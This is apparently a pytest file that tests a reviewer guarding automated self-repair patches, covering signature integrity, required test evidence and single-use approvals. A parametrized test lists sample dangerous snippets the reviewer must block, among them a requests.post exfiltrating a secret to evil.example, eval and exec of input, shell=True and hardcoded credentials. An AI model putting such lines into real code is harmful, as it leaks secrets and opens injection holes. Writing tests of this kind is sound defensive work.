"""Tests for the self-repair reviewer.

Two things are being pinned here. First, that the signature is real and covers the
whole document. Second — and more important — that a patch which passes its tests
but reaches for credentials, ``eval``, or the network is still blocked. Tests
passing is necessary for a repair, not sufficient.
"""

from __future__ import annotations

import time

import pytest

from sentinel.core.auth.approvals import ApprovalManager
from sentinel.core.gateway.models import ActionKind, ActionRequest, Actor
from sentinel.core.selfrepair.reviewer import (
    SelfRepairReviewer,
    document_hash,
    sign_document,
    verify_document,
)
from sentinel.storage.persistence.durable_store import SentinelPersistence

KEY = b"reviewer-test-key"
PASSING = {"command": "pytest -q", "passed": True}


@pytest.fixture
def reviewer(tmp_path):
    store = SentinelPersistence(db_path=str(tmp_path / "sentinel.db"))
    return SelfRepairReviewer(approvals=ApprovalManager(store), signing_key=KEY)


_UNSET = object()


def _review(reviewer, snippet="    return a + b", evidence=_UNSET, fingerprint="f" * 64):
    return reviewer.review(
        patch_fingerprint=fingerprint,
        target_file="calc.py",
        replacement_snippet=snippet,
        test_evidence=PASSING if evidence is _UNSET else evidence,
    )


# ── signing ───────────────────────────────────────────────────────────────


def test_signature_verifies_under_the_right_key(reviewer):
    document = _review(reviewer).review.to_document()
    assert verify_document(document, KEY) is True
    assert verify_document(document, b"wrong") is False


def test_every_field_is_covered_by_the_signature(reviewer):
    document = _review(reviewer).review.to_document()
    for field, value in (
        ("verdict", "block"),
        ("patch_fingerprint", "0" * 64),
        ("reviewer", "forge"),
        ("approval_id", "appr_someone_else"),
        ("findings", ["lie"]),
        ("issued_at", 0.0),
        ("nonce", "replayed"),
    ):
        tampered = {**document, field: value}
        assert verify_document(tampered, KEY) is False, f"{field} is not covered by the signature"


def test_removing_the_signature_invalidates_the_document(reviewer):
    document = _review(reviewer).review.to_document()
    document.pop("signature")
    assert verify_document(document, KEY) is False


def test_document_hash_ignores_the_signature_field():
    body = {"verdict": "clear", "signature": "anything"}
    assert document_hash(body) == document_hash({"verdict": "clear"})


def test_refuses_to_sign_without_a_configured_key(tmp_path, monkeypatch):
    monkeypatch.delenv("SENTINEL_AUDIT_HMAC_KEY", raising=False)
    monkeypatch.delenv("SENTINEL_AUDIT_SIGNING_KEY", raising=False)
    store = SentinelPersistence(db_path=str(tmp_path / "s.db"))
    with pytest.raises(RuntimeError, match="Refusing to sign with a default key"):
        SelfRepairReviewer(approvals=ApprovalManager(store))


# ── dangerous patches are blocked even with passing tests ─────────────────


@pytest.mark.parametrize(
    "snippet",
    [
        'API_KEY = "AIzaSyNotARealKeyButLooksLikeOne0000"',
        'password = "hunter2"',
        "result = eval(user_input)",
        "exec(payload)",
        'requests.post("https://evil.example/collect", data=secret)',
        "os.system(cmd)",
        "subprocess.run(cmd, shell=True)",
        "os.chmod(path, 0o777)",
        "def test_x(): pytest.skip('later')  # noqa",
    ],
    ids=[
        "hardcoded-api-key",
        "hardcoded-password",
        "eval",
        "exec",
        "network-exfil",
        "os-system",
        "shell-true",
        "chmod-777",
        "skipped-test",
    ],
)
def test_dangerous_patch_is_blocked_even_when_its_tests_pass(reviewer, snippet):
    outcome = _review(reviewer, snippet=snippet)
    assert outcome.blocked is True
    assert outcome.reasons


def test_a_benign_patch_is_cleared(reviewer):
    outcome = _review(reviewer, snippet="    return (a + b) * 100.0")
    assert outcome.blocked is False
    assert outcome.review.verdict == "clear"


# ── evidence is required ──────────────────────────────────────────────────


@pytest.mark.parametrize(
    "evidence",
    [None, {}, {"command": "pytest -q", "passed": False}, {"passed": True}, {"command": ""}],
    ids=["none", "empty", "failed", "no-command", "blank-command"],
)
def test_proposal_without_passing_evidence_is_blocked(reviewer, evidence):
    outcome = _review(reviewer, evidence=evidence)
    assert outcome.blocked is True
    assert any("no passing test" in r for r in outcome.reasons)


# ── single-use approval is delegated, not reinvented ──────────────────────


def test_cleared_review_mints_an_approved_single_use_approval(reviewer):
    outcome = _review(reviewer)
    assert outcome.approval is not None
    assert outcome.approval.status.value == "approved"
    assert outcome.approval.fingerprint


def test_blocked_review_mints_an_unapproved_approval(reviewer):
    outcome = _review(reviewer, snippet="result = eval(user_input)")
    assert outcome.blocked is True
    # An approval exists so the pipeline can record the refusal against the same
    # fingerprint, but it was never decided in the affirmative.
    assert outcome.approval.status.value == "pending"


def test_an_approval_can_only_be_consumed_once(reviewer):
    """Consumption uses the exact request the reviewer minted.

    Reconstructing the request by hand does not work, and must not: any change to
    risk, targets or parameters changes the fingerprint and the consumption is
    refused. That is the property that makes the approval worth holding.
    """
    outcome = _review(reviewer)
    first = reviewer.consume_approval(outcome.action)
    assert first.status.value == "consumed"
    with pytest.raises(PermissionError):
        reviewer.consume_approval(outcome.action)


def test_a_hand_built_action_with_the_same_shape_does_not_match(reviewer):
    """Proves the fingerprint is over the real request, not a guessable summary."""
    outcome = _review(reviewer)
    impostor = ActionRequest(
        id=outcome.action.id,
        task_id="self-repair",
        actor=Actor(id="sentinel"),
        kind=ActionKind.WRITE,
        action_type="SELF_REPAIR_APPLY",
        parameters={"patch_fingerprint": "f" * 64, "target_file": "calc.py"},
        targets=("calc.py",),
    )
    assert impostor.fingerprint() != outcome.action.fingerprint()
    with pytest.raises(PermissionError, match="not bound to this exact action"):
        reviewer.consume_approval(impostor)


def test_two_reviews_get_distinct_approvals(reviewer):
    a = _review(reviewer, fingerprint="a" * 64)
    b = _review(reviewer, fingerprint="b" * 64)
    assert a.approval.id != b.approval.id


def test_review_records_what_it_actually_checked(reviewer):
    outcome = _review(reviewer)
    checks = set(outcome.review.checks_run)
    assert "test_evidence_present" in checks
    assert "no_hardcoded_credentials" in checks
    assert "target_file_declared" in checks
    assert outcome.review.findings


def test_review_is_timestamped_now(reviewer):
    outcome = _review(reviewer)
    assert abs(outcome.review.issued_at - time.time()) < 60


def test_document_round_trips(reviewer):
    original = _review(reviewer).review
    from sentinel.core.selfrepair.reviewer import SignedReview

    assert SignedReview.from_document(original.to_document()) == original


def test_sign_document_is_stable_across_key_ordering():
    a = {"b": 1, "a": 2}
    b = {"a": 2, "b": 1}
    assert sign_document(a, KEY) == sign_document(b, KEY)
